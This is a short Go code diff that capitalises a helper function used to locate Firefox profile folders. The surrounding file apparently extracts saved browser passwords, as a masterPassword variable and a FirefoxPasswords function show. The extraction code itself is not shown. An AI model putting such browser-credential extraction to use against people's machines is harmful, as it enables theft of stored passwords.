@@ -10,7 +10,7 @@ import (
 
 var masterPassword = ""
 
-var FirefoxPath = getOperaPath("Mozilla\\Firefox\\Profiles")
+var FirefoxPath = GetOperaPath("Mozilla\\Firefox\\Profiles")
 var FirefoxBrowserName = "FireFox"
 
 func FirefoxPasswords() (string, error) {
